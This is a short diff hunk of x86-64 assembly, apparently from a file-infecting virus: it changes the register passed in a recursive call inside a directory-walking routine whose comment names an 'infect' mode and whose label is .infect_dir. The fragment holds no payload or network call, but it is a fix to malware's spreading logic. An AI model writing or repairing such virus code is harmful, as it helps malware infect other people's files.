@@ -248,7 +248,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 				jmp .free_buffers
 
 		.infect_dir:
-			mov rsi, rbx
+			mov rsi, r13
 			call _move_through_dir
 			jmp .free_buffers
 
